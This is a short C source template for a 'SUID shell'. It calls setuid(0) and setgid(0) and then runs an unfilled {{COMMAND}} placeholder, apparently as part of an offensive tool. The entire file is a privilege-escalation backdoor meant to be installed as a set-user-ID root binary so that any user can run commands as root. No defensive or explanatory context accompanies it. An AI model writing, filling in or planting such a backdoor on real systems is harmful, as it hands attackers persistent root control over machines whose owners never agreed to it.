/* SUID Shell - Execute command as file owner */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    setuid(0);
    setgid(0);
    {{COMMAND}}
    return 0;
}
